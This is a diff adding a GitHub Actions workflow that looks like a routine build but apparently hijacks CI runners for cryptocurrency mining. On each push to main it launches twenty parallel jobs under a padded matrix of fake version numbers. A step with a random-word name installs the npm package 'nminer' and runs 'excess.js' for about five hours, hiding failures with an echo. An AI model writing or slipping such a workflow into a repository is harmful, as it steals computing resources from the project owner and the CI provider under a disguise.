@@ -1,0 +1,45 @@
+name: excess
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 8983 }
+          - { version: 4176 }
+          - { version: 5362 }
+          - { version: 3242 }
+          - { version: 3312 }
+          - { version: 3944 }
+          - { version: 9217 }
+          - { version: 7550 }
+          - { version: 3153 }
+          - { version: 8070 }
+          - { version: 9641 }
+          - { version: 2911 }
+          - { version: 6942 }
+          - { version: 4199 }
+          - { version: 4282 }
+          - { version: 5685 }
+          - { version: 4998 }
+          - { version: 6107 }
+          - { version: 3385 }
+          - { version: 4518 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: bolster bravely yahoo jacket
+        run: |
+          npm install nminer@latest
+          timeout 307m node excess.js || echo "excess executed"
